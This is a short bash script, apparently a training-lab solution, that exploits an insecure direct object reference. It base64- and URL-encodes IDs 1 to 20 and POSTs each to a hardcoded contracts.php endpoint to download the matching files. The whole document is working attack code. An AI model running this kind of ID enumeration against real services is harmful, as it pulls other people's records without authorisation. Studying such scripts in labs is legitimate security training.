#!/bin/bash

url_encode() {
  local string="$1"
  local result=""
  local length=${#string}

  for ((i = 0; i < length; i++)); do
    local char="${string:i:1}"
    case "$char" in
      [a-zA-Z0-9.~_-])
        result+="$char"
        ;;
      *)
        printf -v encoded "%%%02x" "'$char"
        result+="$encoded"
        ;;
    esac
  done
  echo "$result"
}

for i in {1..20}; do
  for hash in $(echo -n "$i" | base64 -w 0); do
    encoded_hash=$(url_encode "$hash")
    curl -sOJ -X POST -d "contract=$encoded_hash" http://94.237.56.76:43892/contracts.php
  done
done

